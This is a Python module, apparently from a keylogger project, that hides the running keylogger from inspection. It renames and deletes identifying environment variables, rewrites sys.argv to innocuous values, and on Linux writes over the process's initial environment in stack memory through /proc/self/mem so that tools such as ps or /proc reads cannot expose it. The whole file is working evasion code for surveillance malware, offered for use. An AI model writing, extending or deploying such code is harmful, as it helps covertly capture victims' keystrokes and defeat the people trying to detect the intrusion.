"""
Environment variable sanitiser for stealth mode.

Handles:
  - Renaming ``KEYLOGGER_*`` env var prefix to ``SVC_*``
  - Scrubbing ``/proc/self/environ`` on Linux (overwrite with innocuous values)
  - Full ``sys.argv`` sanitisation (not just ``argv[0]``)
  - Removing any env vars that reference identifiable strings

Research notes (Feb 2026):
  - ``/proc/PID/environ`` only contains the *initial* environment from execve()
  - Overwriting via ctypes + ``/proc/self/mem`` can zero out the stack-stored env strings
  - ``os.environ`` modifications don't affect ``/proc/PID/environ`` (kernel reads initial stack)
  - On macOS, ``ps eww`` shows environment; ``os.unsetenv()`` removes from real env

Usage::

    from stealth.env_sanitizer import EnvSanitizer

    sanitizer = EnvSanitizer(config)
    sanitizer.apply()
"""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import sys
from typing import Any

logger = logging.getLogger(__name__)

# ── Identifiable env var patterns ────────────────────────────────────

_IDENTIFIABLE_PREFIXES = ["KEYLOGGER_", "AKL_", "ADVANCEKEYLOGGER_"]
_SAFE_PREFIX = "SVC_"

# Identifiable strings in env var values
_IDENTIFIABLE_VALUE_PATTERNS = ["keylogger", "advancekeylogger", "akl"]


def _get_platform() -> str:
    return platform.system().lower()


class EnvSanitizer:
    """Environment variable sanitisation.

    Parameters
    ----------
    config : dict
        The ``stealth`` config section.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        self._platform = _get_platform()
        self._applied = False

    def apply(self) -> None:
        """Apply all environment sanitisation measures."""
        if self._applied:
            return

        self._rename_env_vars()
        self._remove_identifiable_vars()
        self._sanitize_full_argv()

        if self._platform == "linux":
            self._scrub_proc_environ()

        self._applied = True
        logger.debug("Environment sanitiser applied")

    # ── Env var renaming ─────────────────────────────────────────────

    def _rename_env_vars(self) -> None:
        """Rename ``KEYLOGGER_*`` vars to ``SVC_*`` prefix."""
        renames: list[tuple[str, str, str]] = []  # (old_key, new_key, value)
        for key, value in list(os.environ.items()):
            for prefix in _IDENTIFIABLE_PREFIXES:
                if key.startswith(prefix):
                    new_key = _SAFE_PREFIX + key[len(prefix):]
                    renames.append((key, new_key, value))
                    break

        for old_key, new_key, value in renames:
            try:
                os.environ[new_key] = value
                del os.environ[old_key]
            except Exception:
                pass

    def _remove_identifiable_vars(self) -> None:
        """Remove env vars whose *values* contain identifiable strings."""
        to_remove: list[str] = []
        for key, value in os.environ.items():
            lower_val = value.lower()
            for pattern in _IDENTIFIABLE_VALUE_PATTERNS:
                if pattern in lower_val:
                    to_remove.append(key)
                    break

        for key in to_remove:
            try:
                del os.environ[key]
            except Exception:
                pass

    # ── Full sys.argv sanitisation ───────────────────────────────────

    @staticmethod
    def _sanitize_full_argv() -> None:
        """Replace all ``sys.argv`` entries with innocuous values."""
        if not sys.argv:
            return
        # Replace argv[0] with a generic service name
        sys.argv[0] = "service"
        # Replace any remaining args that might reveal purpose
        for i in range(1, len(sys.argv)):
            arg = sys.argv[i].lower()
            for pattern in _IDENTIFIABLE_VALUE_PATTERNS:
                if pattern in arg:
                    sys.argv[i] = "--config"
                    break

    # ── /proc/self/environ scrubbing (Linux only) ────────────────────

    @staticmethod
    def _scrub_proc_environ() -> None:
        """Overwrite identifiable entries in the process's initial environment.

        On Linux, ``/proc/self/environ`` contains the environment strings from
        ``execve()``. We can overwrite them via ``/proc/self/mem`` to remove
        identifiable values from the kernel-visible copy.

        This is a best-effort approach — there's always a brief startup window
        before this runs.
        """
        try:
            # Read current /proc/self/environ
            with open("/proc/self/environ", "rb") as f:
                environ_data = f.read()

            if not environ_data:
                return

            # Find identifiable entries and their positions
            entries = environ_data.split(b"\x00")
            modified = False
            new_entries: list[bytes] = []

            for entry in entries:
                if not entry:
                    new_entries.append(entry)
                    continue

                lower_entry = entry.lower()
                should_scrub = False

                # Check if this entry has an identifiable prefix
                for prefix in _IDENTIFIABLE_PREFIXES:
                    if lower_entry.startswith(prefix.lower().encode()):
                        should_scrub = True
                        break

                # Check if value contains identifiable strings
                if not should_scrub:
                    for pattern in _IDENTIFIABLE_VALUE_PATTERNS:
                        if pattern.encode() in lower_entry:
                            should_scrub = True
                            break

                if should_scrub:
                    # Replace with zeros (same length to preserve layout)
                    new_entries.append(b"\x00" * len(entry))
                    modified = True
                else:
                    new_entries.append(entry)

            if not modified:
                return

            # Write back via /proc/self/mem
            # Find the environ mapping in /proc/self/maps
            new_data = b"\x00".join(new_entries)
            # Only proceed if same length (preserves kernel page layout)
            if len(new_data) == len(environ_data):
                _overwrite_proc_environ(environ_data, new_data)

        except Exception as exc:
            logger.debug("proc environ scrub failed (expected on non-Linux): %s", exc)


def _overwrite_proc_environ(old_data: bytes, new_data: bytes) -> None:
    """Low-level overwrite of /proc/self/environ via /proc/self/mem."""
    try:
        # Find the stack mapping that contains environ
        with open("/proc/self/maps", "r") as maps_file:
            for line in maps_file:
                if "[stack]" in line:
                    parts = line.split()[0].split("-")
                    stack_start = int(parts[0], 16)
                    stack_end = int(parts[1], 16)

                    # Search for old_data within the stack region
                    with open("/proc/self/mem", "r+b") as mem:
                        mem.seek(stack_start)
                        stack_data = mem.read(stack_end - stack_start)
                        offset = stack_data.find(old_data)
                        if offset >= 0:
                            mem.seek(stack_start + offset)
                            mem.write(new_data)
                    return
    except Exception:
        pass
